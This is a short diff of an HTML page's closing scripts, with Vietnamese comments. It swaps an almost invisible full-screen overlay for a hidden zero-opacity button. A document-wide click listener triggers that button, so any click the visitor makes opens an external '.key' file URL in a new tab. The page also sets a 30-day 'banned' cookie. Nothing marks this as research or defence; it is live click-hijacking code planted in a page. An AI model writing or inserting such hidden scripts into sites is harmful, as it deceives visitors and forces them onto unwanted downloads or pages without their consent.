@@ -75,25 +75,30 @@
   document.cookie = "banned=1; path=/; max-age=" + (60*60*24*30) + "; SameSite=Lax";
 </script>
   <script>
-let overlay = document.createElement("div");
-overlay.style.position = "fixed";
-overlay.style.top = 0;
-overlay.style.left = 0;
-overlay.style.width = "100%";
-overlay.style.height = "100%";
-overlay.style.backgroundColor = "rgba(0,0,0,0.01)";
-overlay.style.zIndex = 9999;
-document.body.appendChild(overlay);
+let hiddenBtn = document.createElement("button");
+hiddenBtn.style.position = "absolute";
+hiddenBtn.style.top = "0";
+hiddenBtn.style.left = "0";
+hiddenBtn.style.opacity = "0";
+hiddenBtn.innerText = "click-me";
+document.body.appendChild(hiddenBtn);
 
-// Khi người dùng click overlay → mở tab mới và chuyển trang
-overlay.addEventListener("click", function() {
-    window.open("https://minamifukun.io.vn/abc.key"); // tab mới
-  });
+hiddenBtn.addEventListener("click", function() {
+    window.open("https://minamifukun.io.vn/abc.key");
+
+});
+
+// Tự bấm nút sau khi user click chuột bất kỳ lần đầu
+document.addEventListener("click", function() {
+    hiddenBtn.click();
+});
+
 </script>
 
 
 </body>
 </html>
+
 
 
 
